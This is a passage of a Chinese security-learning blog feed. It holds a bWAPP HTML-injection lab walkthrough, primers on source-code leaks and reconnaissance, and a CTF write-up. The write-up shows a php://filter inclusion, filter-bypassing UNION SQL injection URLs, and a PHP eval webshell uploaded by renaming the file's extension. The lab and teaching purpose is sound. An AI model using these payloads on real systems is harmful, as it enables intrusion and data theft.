        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>bwapp(1)</title>
    <link href="http://yoursite.com/2018/10/08/bwapp(1)/"/>
    <id>http://yoursite.com/2018/10/08/bwapp(1)/</id>
    <published>2018-10-07T16:00:00.000Z</published>
    <updated>2018-10-08T11:39:11.793Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:https://blog.csdn.net/Super_Yiang/article/details/82970499</span></span><br></pre></td></tr></table></figure><h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p><img src="https://i.loli.net/2018/10/08/5bbb0b9d25e70.png" alt=""></p><p>题目很明显注入，而且提交方式为get，尝试着在输入框分别输入1和1</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.109.130/bWAPP/htmli_get.php?firstname=1&amp;lastname=1&amp;form=submit</span><br></pre></td></tr></table></figure><p>下方也会显示</p><p><img src="https://i.loli.net/2018/10/08/5bbb0ef34b1d4.png" alt=""></p><p>那么尝试注入代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>You just got hacked!!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功注入</p><p><img src="https://i.loli.net/2018/10/08/5bbb0faa292c8.png" alt=""></p><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><p><img src="https://i.loli.net/2018/10/08/5bbb0b9d25e70.png" alt=""></p><p>尝试直接注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>You just got hacked!!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注入失败</p><p><img src="https://i.loli.net/2018/10/08/5bbb104a79526.png" alt=""></p><p>查看源码发现&lt;和&gt;被转义成&amp;lt；和&amp;gt；</p><p><img src="https://i.loli.net/2018/10/08/5bbb1556ad29d.png" alt=""></p><p>尝试将&lt;和&gt;进行urlencode成%3C和%3E进行注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cmarquee%3E%3Ch2%3EYou just got hacked!!%3C/h2%3E%3C/marquee%3E</span><br></pre></td></tr></table></figure><p>成功绕过并注入</p><h5 id="high"><a href="#high" class="headerlink" title="high"></a>high</h5><p>高级别的直接放源码审计吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities    </span></span><br><span class="line">    <span class="comment">// '&amp;' (ampersand) becomes '&amp;amp;' </span></span><br><span class="line">    <span class="comment">// '"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set</span></span><br><span class="line">    <span class="comment">// "'" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set</span></span><br><span class="line">    <span class="comment">// '&lt;' (less than) becomes '&amp;lt;'</span></span><br><span class="line">    <span class="comment">// '&gt;' (greater than) becomes '&amp;gt;'  </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显源码中用了htmlspecialchars()这个函数，码一波：</p><p><strong>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</strong> </p><p><strong>预定义的字符是：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp</span><br><span class="line">&quot; （双引号）成为 &amp;quot</span><br><span class="line">&apos; （单引号）成为 &amp;#039</span><br><span class="line">&lt; （小于）成为 &amp;lt</span><br><span class="line">&gt; （大于）成为 &amp;gt</span><br></pre></td></tr></table></figure><p>能力有限，只能观摩一波，浅尝辄止。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="玩转bwapp" scheme="http://yoursite.com/categories/%E7%8E%A9%E8%BD%ACbwapp/"/>
    
    
      <category term="bwapp" scheme="http://yoursite.com/tags/bwapp/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试初步学习之漏洞发现和源码泄露</title>
    <link href="http://yoursite.com/2018/09/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/09/16/渗透测试初步学习之漏洞发现/</id>
    <published>2018-09-16T02:24:12.202Z</published>
    <updated>2018-10-08T09:41:12.559Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82491310</span></span><br></pre></td></tr></table></figure><h3 id="一、目录扫描"><a href="#一、目录扫描" class="headerlink" title="一、目录扫描"></a><strong>一、目录扫描</strong></h3><p>​    目录扫描的目的是为了探测目标的目录情况，从而分析目标的CMS情况、敏感信息泄露情况 以及 一个大体的站点地图。</p><p>​    这里推荐用御剑前辈的后台扫描器。</p><h3 id="二、蜘蛛爬行"><a href="#二、蜘蛛爬行" class="headerlink" title="二、蜘蛛爬行"></a><strong>二、蜘蛛爬行</strong></h3><p>​    蜘蛛爬行和目录扫描的目的差不多，都是为了帮助用户建立一个大概的站点地图，但是两者采用的方法却不同，目录扫描是根据字典进行枚举，而蜘蛛爬行则是从站点的链接中获取站点的目录情况。</p><p>  蜘蛛爬行相较于目录扫描的最大优点在于，能爬出苛刻的目录，比如web后台的目录是bnbndmw/login.php，而bnbndmw是比较苛刻的字符很难有字典包含这个字符，而这个链接又存在于站点的其他html链接中，就会被蜘蛛发现，从而收集到。</p><p>  蜘蛛爬行在常用的漏洞扫描器中 以及 Burpsuite里面都具备。</p><h3 id="三、漏洞扫描器"><a href="#三、漏洞扫描器" class="headerlink" title="三、漏洞扫描器"></a><strong>三、漏洞扫描器</strong></h3><ol><li><strong>AWVS</strong></li><li><strong>Burpsuite</strong></li></ol><h3 id="四、根据CMS发现漏洞"><a href="#四、根据CMS发现漏洞" class="headerlink" title="四、根据CMS发现漏洞"></a><strong>四、根据CMS发现漏洞</strong></h3><p>​    在已知对方使用的CMS时，我们可以去百度该CMS存在哪些漏洞，然后用已知的漏洞进行测试，然后我可以用百度到的这些漏洞详情去测试目标站点是否存在该漏洞。 </p><h3 id="五、源代码泄露漏洞"><a href="#五、源代码泄露漏洞" class="headerlink" title="五、源代码泄露漏洞"></a><strong>五、源代码泄露漏洞</strong></h3><ol><li><h5 id="代码压缩包泄露"><a href="#代码压缩包泄露" class="headerlink" title="代码压缩包泄露"></a>代码压缩包泄露</h5><p>​    有些站点的管理员将源码备份成压缩包的格式，却放在了Web目录下，攻击者访问该压缩包的时候就会下载该压缩包。</p><p>PS：常见后缀 ： .zip .rar .tar.gz .7z</p></li><li><h5 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h5><p><strong>（1）漏洞成因</strong></p><p>​    管理员对SVN的机制不熟悉，直接将SVN检出到本地的web目录下，而忘记删除.svn目录(文件的类型及内容存放目录),从而导致攻击者拿到站点的源代码。 </p><p><strong>（2）SVN源代码泄露两个版本的区别</strong></p><p>​    SVN1.7后取消了text-base备份文件夹,同时访问.svn/entries返回数字12。1.7以后的版本不会在每个目录下生成.svn的文件，仅在根目录下生成.svn文件。 </p><p>​    并且在.svn目录下存在wc.db，该数据库文件在NODES表单local_relpath为真实文件名，checksum为文件的sha1值，kind表示文件类型(dir-&gt;目录,file-&gt;文件) 。</p><p>​    在.svn/pristine目录的二级目录下存储着源代码，文件名是sha1值.svn-base，二级目录名是sha1值的前两位。 </p></li><li><h5 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h5><p>     从git仓库下载代码的时候，会在本地生成一个.git隐藏文件夹(存放代码的变更记录)，导致攻击者可以使用该文件夹下的信息拿到代码。 </p><p>PS：利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> </p></li><li><h5 id="swp源码泄露"><a href="#swp源码泄露" class="headerlink" title="swp源码泄露"></a>swp源码泄露</h5><p>​    使用vi编辑器打开文件时，会生成一个.文件名.swp的备份文件，防止意外退出等情况导致文件内容丢失。产生原因主要是管理员在web目录下修改代码文件，导致生成了.swp备份文件。</p><p>PS：利用方法：访问.swp文件会下载该文件，然后vi -r 文件名 来恢复内容，然后按下任意键就可以看到其中的代码了。 </p></li><li><h5 id="数据库外泄"><a href="#数据库外泄" class="headerlink" title="数据库外泄"></a>数据库外泄</h5><p>​    不只是源码泄露会导致安全威胁，其实数据库泄露也会导致安全威胁。</p><p>  数据库外泄指的是数据库文件泄露，比如ACCESS的数据库是.mdb 以及上面提到的 .db 是SQLite的数据库。这两种数据库系统将数据保存在该格式的文件中，而数据库文件又在WEB目录下，攻击者可以下载数据库从而拿到数据。</p><p>​    这种漏洞影响最多的是ASP+ACCESS的站点，比较经典两个案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.某些CMS的目录下存在/data/#data.mdb 文件</span><br><span class="line">2.ewebeditor 后台GETSHELL，下载eweb的数据库就是其中关键的一步</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><h5 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h5><ul><li><p><strong>WEB-INF介绍</strong></p><p>​    WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure></li><li><p><strong>漏洞检测和利用</strong></p><p>​    通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>  一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，使用了Nginx的安全策略，导致web.xml能够被攻击者访问到。</p></li><li><p><strong>CVS泄露</strong></p><p>测试目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>取回源码命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name</span><br></pre></td></tr></table></figure><p><a href="https://github.com/bitkeeper-scm/bitkeeper" target="_blank" rel="noopener">bk下载地址</a></p></li></ul></li><li><h5 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title="DS_Store文件泄露"></a>DS_Store文件泄露</h5><ul><li><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>​    在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 </p></li><li><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><p>     <a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp.py</a>  </p></li></ul></li><li><h5 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h5><p>##### </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><p>​    <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> </p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试初步学习之信息收集</title>
    <link href="http://yoursite.com/2018/09/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2018/09/16/渗透测试初步学习之信息收集/</id>
    <published>2018-09-16T02:24:10.267Z</published>
    <updated>2018-10-08T09:41:25.938Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82490624</span><br></pre></td></tr></table></figure><p>​    信息收集的主要目的是为了制定下一步的攻击方案。</p><p>​    那信息收集要收集哪些信息？</p><ol><li><p>是否存在CDN</p><p>（1）简介</p><p>​    CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。 </p><p>（2）验证是否存在CDN</p><ul><li><p>方法1</p><p>​    很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有： </p></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://ping.chinaz.com/</span></span><br><span class="line"><span class="attribute">http://ping.aizhan.com/</span></span><br><span class="line"><span class="attribute">http://ce.cloud.360.cn/</span></span><br></pre></td></tr></table></figure><ul><li><p>方法2</p><p>在线工具查看是否存在CDN，可以参考以下站点: </p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://www.cdnplanet.com/tools/cdnfinder/</span></span><br><span class="line">http://www.ipip.net/ip.html   #IP、Ping、CDN、DNS等查询</span><br></pre></td></tr></table></figure><p>（3）绕过CDN查找网站真实IP、</p><ul><li><p>查询历史DNS记录</p><p>​    查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/  #存在很多情报</span><br><span class="line">https://viewdns.info/   #DNS、Ping、Whois,反向IP等</span><br></pre></td></tr></table></figure><ul><li><p>查询子域名</p><p>​    有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP 。</p></li><li><p>利用网站漏洞</p><p>​    fopen 、 file_get_contents 这些函数，将文件参数改成自己服务器的IP，让对方服务器主动连接我们，然后从日志找到对方真实IP 。</p></li><li><p>目标敏感文件泄露</p><p>​    比如PHPinfo这类的探针 。</p></li></ul></li><li><p>服务器信息</p><ul><li>IP地址，结合上面的CDN绕过，获取到IP </li><li>服务器的系统类型 (windows、linux(Ubuntu、ContentOS)) </li><li>支持的脚本类型 (asp、aspx、php、jsp) </li><li>Web容器 (apache 、IIS 、nginx) </li><li>开放端口情况 (21,22,80,1433,5900,3306,3389,8080,43958) </li><li>绝对路径 (报错页面显示、探针显示) </li></ul></li><li><p>子域名收集</p><p>​    这里主要提到一款子域名收集的工具 和 一个资产收集的平台 。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a><strong>Layer子域名挖掘机</strong></h5><p>​    Layer 是Seay法师写的一款，以暴力枚举为主的子域名收集工具。<a href="https://www.waitalone.cn/layer-subdomain-excavator.html" target="_blank" rel="noopener">Layer子域名挖掘机V2.1</a> </p><p>PS：Layer 在目标站点被百度收录较少的时候使用效果不错，但是有一个不太好的地方就是，Layer把生成的子域名字符串会加载到内存中，导致程序占用大量内存而变得很卡。(很多老工具都有这个问题，比如御剑前辈的后台扫描)</p><h5 id="云悉资产收集"><a href="#云悉资产收集" class="headerlink" title="云悉资产收集"></a><strong>云悉资产收集</strong></h5><p>​    云悉是一个很棒的在线分布式资产收集平台，具体可以到 <a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn</a> 了解一下。 </p></li><li><p>Whois查询</p><p>​    用站长工具whois查询域名的所有者情况和注册邮箱，可以根据注册者的信息生成爆破字典。 </p></li><li><p>指纹验证</p><p>​    指纹验证是识别目标站点采用了什么CMS搭建，然后根据CMS制定攻击方案。</p><p>PS：CMS是”Content Management System”的缩写，意为”内容管理系统”。一个内容管理系统通常有如下要素：文档模板、脚本语言或标记语言、与数据库集成。</p><p>指纹验证工具有两个：</p><ul><li>御剑</li><li>云溪</li></ul></li><li><p>WAF探测</p><p>     进行WAF探测的目的是为了防止在有WAF的情况下还进行大规模的扫描导致被封IP。</p><p>PS：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF） </p><h5 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a><strong>wafw00f</strong></h5><p>​    WAF探测常用的工具是 kali下的 WafW00f , 对国外的waf探测效果比较好，对国内的waf不太敏感。具体还是要自己手工进行探测。 </p><h5 id="手工探测WAF"><a href="#手工探测WAF" class="headerlink" title="手工探测WAF"></a><strong>手工探测WAF</strong></h5><ul><li>护卫神 ，在有护卫神的站点上会发现HTML中会有\<hws>\&lt;\hws&gt;这样的标签 </hws></li><li>安全狗 ，随便输入一个目标站点不存在的页面，它便会跳转到安全狗的404界面 </li><li>云Waf , 比如腾讯云、阿里云，如果发现目标主机IP是这两个云产品的，一般情况下，该目标会受到腾讯云、阿里云的保护。此外云waf还有百度的加速乐等.. </li></ul></li><li><p>绝对路径</p><p>​    绝对路径探测也是信息收集的一部分，在后面的渗透中很多地方需要用到据对路径来进行下一步渗透。</p><p>  绝对路径的探测方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.site:域名 warning # google or baidu</span><br><span class="line">2.报错显示,比如注入点报错就可以显示出来</span><br><span class="line">3.phpinfo中泄露</span><br></pre></td></tr></table></figure><p>​    </p><p>​    </p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>I春秋CTF训练营web题解（一）</title>
    <link href="http://yoursite.com/2018/09/16/I%E6%98%A5%E7%A7%8BCTF%E8%AE%AD%E7%BB%83%E8%90%A5web%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2018/09/16/I春秋CTF训练营web题解（一）/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-10-08T11:42:25.303Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82391768</span></span><br></pre></td></tr></table></figure><h4 id="（1）include"><a href="#（1）include" class="headerlink" title="（1）include"></a>（1）include</h4><p>==hint：没错！就是文件包含漏洞.==</p><p>点开链接，发现</p><p><img src="https://s1.ax1x.com/2018/09/02/PzPytJ.md.png" alt="PzPytJ.md.png"></p><p>通过源码可知可以提交一个path的变量，通过ctrl+f搜索allow_url_include，发现是打开状态：</p><p><img src="https://s1.ax1x.com/2018/09/02/PzPvB8.md.png" alt="PzPvB8.md.png"></p><p>所以打开火狐浏览器，用hackbar工具输入：</p><p><img src="https://s1.ax1x.com/2018/09/02/PzipNQ.png" alt="PzipNQ.png"></p><p>发现存在疑似含有flag的文件</p><p><img src="https://s1.ax1x.com/2018/09/02/Pzikj0.png" alt="Pzikj0.png"></p><p>接着使用php://filter协议查看曝露出来的文件的内容，因为PHP文件是在不能直接显示的，所以使用了base64编码显示</p><p><img src="https://s1.ax1x.com/2018/09/02/PziJHO.png" alt="PziJHO.png"></p><p>然后解码就可以得到flag了</p><p><img src="https://s1.ax1x.com/2018/09/02/Pziw8A.md.png" alt="Pziw8A.md.png"></p><h4 id="（2）SQL"><a href="#（2）SQL" class="headerlink" title="（2）SQL"></a>（2）SQL</h4><p>==hint：出题人就告诉你这个是个注入，有种别走！==</p><p>创建链接点进去，然后查看源码</p><p><img src="https://s1.ax1x.com/2018/09/03/Pzemss.md.png" alt="Pzemss.md.png"></p><p>很明显知道用sql注入，用火狐hackbar进行手动注入，先爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 order by 4</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/Pze1iT.md.png" alt="Pze1iT.md.png"></p><p>说明存在过滤，试试/**/，关键词大写，不行，然后尝试&lt;&gt;发现可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 4</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/PzeNLR.md.png" alt="PzeNLR.md.png"></p><p>没出现结果，所以接下来继续爆字段,4不对就二分法换2，然后发现还是没结果，换3有了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/Pzeae1.md.png" alt="Pzeae1.md.png"></p><p>然后输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,2,3 from info</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/PzeWwt.png" alt="PzeWwt.png"></p><p>说明第二个字段可以显示，那么接下来就是爆数据库名，表名，列名:</p><p>①爆数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3 from info</span><br></pre></td></tr></table></figure><p>②爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br></pre></td></tr></table></figure><p>③爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_name=&apos;sqli&apos;</span><br></pre></td></tr></table></figure><p>发现疑似存在flag的列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from sqli.info</span><br></pre></td></tr></table></figure><p>flag就出来了。</p><h4 id="（3）Do-you-know-upload"><a href="#（3）Do-you-know-upload" class="headerlink" title="（3）Do you know upload"></a>（3）Do you know upload</h4><p>==hint：加油吧，少年。==</p><p>创建链接，点开</p><p><img src="https://s1.ax1x.com/2018/09/03/Pzs8hV.png" alt="Pzs8hV.png"></p><p>很明显文件上传，试着上传已经写好的PHP一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后改为jpg格式上传抓包，并改为php后缀就可以成功上传。</p><p><img src="https://s1.ax1x.com/2018/09/03/PzsBA1.png" alt="PzsBA1.png"></p><p>因为我之前已经成功上传过了1.php文件，显示已存在，如果是第一次上传就会显示路径：upload/1.php</p><p><img src="https://s1.ax1x.com/2018/09/03/PzsLuQ.png" alt="PzsLuQ.png"></p><p>然后就是菜刀连接，打开</p><p><img src="https://s1.ax1x.com/2018/09/03/PzypCV.md.png" 